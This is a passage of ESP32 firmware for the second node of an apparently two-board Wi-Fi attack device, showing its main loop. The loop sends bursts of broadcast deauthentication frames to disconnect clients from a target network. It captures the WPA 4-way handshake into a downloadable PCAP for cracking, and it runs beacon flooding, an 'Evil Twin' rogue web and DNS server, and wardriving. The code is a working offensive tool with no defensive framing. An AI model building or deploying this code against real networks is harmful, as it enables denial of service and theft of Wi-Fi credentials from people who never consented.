    Serial.println("ESP-NOW peer (Node 1) registered OK.");

  // ★ Force radio to channel 1 so ESP-NOW and ESP1 agree from the start
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  lastChan = 1;

  Serial.printf("Free heap: %lu bytes\n", (unsigned long)ESP.getFreeHeap());
  Serial.println("Node 2 ready — waiting for commands from Node 1.");
  Serial.println("================================================\n");
}

// ═════════════════════════════════════════════════════════════════
//  LOOP
// ═════════════════════════════════════════════════════════════════
// Track the "attack channel" so we can hop back to ch1 periodically
static uint8_t       attackChan      = 1;
static unsigned long lastCh1HopTime  = 0;
#define CH1_HOP_MS     500   // check ch1 every 500ms
#define CH1_LISTEN_MS   15   // stay on ch1 for 15ms to receive commands

void loop() {
  unsigned long now = millis();

  // ── Channel hop-back: briefly visit ch1 to hear ESP1 ──
  // When attacking on a different channel, ESP2 can't receive
  // ESP-NOW from ESP1 (which is always on ch1). So we hop back
  // to ch1 briefly every 500ms to check for pending commands.
  attackChan = lastChan;  // track current attack channel
  if (attackChan != 1 && (now - lastCh1HopTime >= CH1_HOP_MS)) {
    lastCh1HopTime = now;
    bool wasProm = false;
    // Temporarily pause promiscuous to avoid noise on ch1
    esp_wifi_get_promiscuous(&wasProm);
    if (wasProm) esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    delay(CH1_LISTEN_MS);  // listen for ESP1 commands
    // Hop back to attack channel
    esp_wifi_set_channel(attackChan, WIFI_SECOND_CHAN_NONE);
    if (wasProm) esp_wifi_set_promiscuous(true);
  }

  // ── Dispatch next command from FIFO queue ─────
  if (cmdQHead != cmdQTail) {
    char local[CMD_LEN];
    memcpy(local, cmdQueue[cmdQHead], CMD_LEN);
    cmdQHead = (cmdQHead + 1) % CMD_QUEUE_SIZE;
    processCommand(local);
  }

  now = millis();

  // ── Monitor stats ──────────────────────────────
  if (monitorRunning && now-lastStatTime >= STAT_MS) {
    lastStatTime = now;
    uint32_t c = pktCount; pktCount = 0;
    char b[90];
    snprintf(b,sizeof(b),"[Monitor] pkts/s=%lu  RSSI=%d  ch=%d",
      (unsigned long)c, (int)lastRSSI, (int)lastChan);
    sendToESP1(b);
  }

  // ── EAPOL staging ISR → loop ──────────────────
  if (hsPktReady && hsRunning) {
    hsPktReady = false;
    appendPcapPkt(hsTmpPkt, hsTmpLen);
    hsEapolCount++;
    char b[70];
    snprintf(b,sizeof(b),"[Handshake] EAPOL frame #%d captured!", hsEapolCount);
    sendToESP1(b);
    if (hsEapolCount >= 4) {
      sendToESP1("[Handshake] 4-way handshake complete! Click 'Download PCAP'.");
    }
  }

  // ── Periodic deauth while capturing handshake ─
  if (hsRunning && now-lastHsDeauthTime >= HS_DEAUTH_MS) {
    lastHsDeauthTime = now;
    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t frm[26];
    // Send 6 deauth frames to keep clients disconnected
    for (int i = 0; i < 6; i++) {
      buildDeauthFrame(frm, hsBSSID, bcast);
      esp_wifi_80211_tx(WIFI_IF_STA, frm, sizeof(frm), false);
      delay(4);
    }
    char b[70];
    snprintf(b, sizeof(b), "[Handshake] Deauth pulse sent (%d EAPOL so far)", hsEapolCount);
    sendToESP1(b);
  }

  // ── Attack loops ──────────────────────────────
  if (deauthRunning && now-lastDeauthTime >= DEAUTH_MS) {
    lastDeauthTime = now; doDeauth();
  }
  if (beaconRunning && now-lastBeaconTime >= BEACON_MS) {
    lastBeaconTime = now; doBeacon();
  }

  // ── Evil Twin web server ─────────────────────
  if (evilTwinRunning) {
    if (evilServer) evilServer->handleClient();
    if (dnsServer)  dnsServer->processNextRequest();
  }

  // ── Wardriving ────────────────────────────────
  if (wardrive && now-lastWdTime >= WD_INTERVAL) {
    lastWdTime = now;
    doWardrive();
  }

  delay(5);
}
